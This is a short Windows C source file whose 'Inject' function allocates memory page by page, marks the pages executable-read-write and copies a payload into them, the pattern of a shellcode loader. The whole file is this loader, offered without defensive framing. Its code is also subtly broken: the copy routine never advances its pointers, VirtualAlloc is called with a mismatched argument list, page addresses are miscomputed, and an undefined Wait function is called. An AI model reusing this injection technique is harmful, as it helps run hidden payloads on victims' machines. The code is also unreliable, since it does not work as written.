#include <Windows.h>

#define		PAGE_SIZE					4096
#define		SET_TO_MULTIPLE_OF_4096(X)	( ((X) + 4095) & (~4095) )

VOID _Memcpy(_In_ PVOID Destination, _In_ PVOID Source, _In_ SIZE_T Length)
{
	while (Length--)
	{
		*((PBYTE)Destination) = *((PBYTE)Source);
	}
}

PVOID Inject(_In_ PBYTE PayloadBuffer, _In_ SIZE_T PayloadSize)
{
	DWORD NewSize		 = SET_TO_MULTIPLE_OF_4096(PayloadSize);
	PVOID StartAddress   = NULL;

	if (!VirtualAlloc(NULL, &StartAddress, &NewSize, MEM_RESERVE, PAGE_READONLY))
	{
		return NULL;
	}

	PVOID TempAddress = StartAddress;

	for (DWORD i = 0; i < NewSize / PAGE_SIZE; i++)
	{
		if (!VirtualAlloc(NULL, &TempAddress, PAGE_SIZE, MEM_COMMIT, PAGE_READWRITE))
		{
			return NULL;
		}
		TempAddress = (PVOID)((ULONG_PTR)StartAddress + PAGE_SIZE);
	}

	Wait(FALSE);

	TempAddress         = StartAddress;
	DWORD OldProtection = NULL;

	for (DWORD i = 0; i < NewSize / PAGE_SIZE; i++)
	{
		if (!VirtualProtect(&TempAddress, PAGE_SIZE, PAGE_EXECUTE_READWRITE, &OldProtection))
		{
			return NULL;
		}
		TempAddress = (PVOID)((ULONG_PTR)StartAddress + PAGE_SIZE);
	}

	// Write

	TempAddress = StartAddress;

	for (DWORD i = 0; i < NewSize / PAGE_SIZE; i++)
	{	
		_Memcpy(StartAddress, PayloadBuffer, PAGE_SIZE);

		PayloadBuffer = (PBYTE)((ULONG_PTR)PayloadBuffer + PAGE_SIZE);
		TempAddress   = (PBYTE)((ULONG_PTR)StartAddress  + PAGE_SIZE);
	}

	return StartAddress;
}